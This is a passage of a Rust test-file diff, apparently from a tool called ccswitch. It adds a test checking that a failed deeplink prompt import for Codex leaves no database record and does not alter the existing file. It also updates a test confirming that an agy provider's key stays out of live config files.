-    assert_eq!(std::fs::read_to_string(path).unwrap(), "Agy instructions");
-    assert!(!crate::gemini_config::get_gemini_dir()
-        .join("GEMINI.md")
-        .exists());
+}
+
+#[test]
+#[serial_test::serial]
+fn enabled_deeplink_prompt_failure_does_not_leave_a_disabled_record() {
+    let _home = TestHomeGuard::new();
+    let state = AppState::new(Arc::new(Database::memory().unwrap()));
+    let path = crate::prompt_files::prompt_file_path(&AppType::Codex).unwrap();
+    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+    std::fs::write(&path, [0xff]).unwrap();
+    let content = BASE64_URL_SAFE_NO_PAD.encode("instructions");
+    let request = parse_deeplink_url(&format!(
+        "ccswitch://v1/import?resource=prompt&app=codex&name=Broken&content={content}&enabled=true"
+    ))
+    .unwrap();
+    assert!(import_prompt_from_deeplink(&state, request).is_err());
+    assert!(state.db.get_prompts(&AppType::Codex).unwrap().is_empty());
+    assert_eq!(std::fs::read(&path).unwrap(), [0xff]);
 }
 
 #[test]
@@ -2217,7 +1782,11 @@ fn agy_deeplink_enabled_key_provider_stays_out_of_live_files() {
     // to agy started from "Open Terminal" with its private profile.
     assert!(!crate::agy_config::settings_path().exists());
     assert!(!crate::config::get_home_dir().join(".gemini/.env").exists());
-    let row = state.db.get_provider_by_id(&id, "agy").unwrap().unwrap();
+    let row = state
+        .db
+        .get_provider_by_id(&id, &AppType::Agy)
+        .unwrap()
+        .unwrap();
     let launch = crate::services::provider::agy_direct::terminal_launch(&row).unwrap();
     assert_eq!(
         launch.env[0],
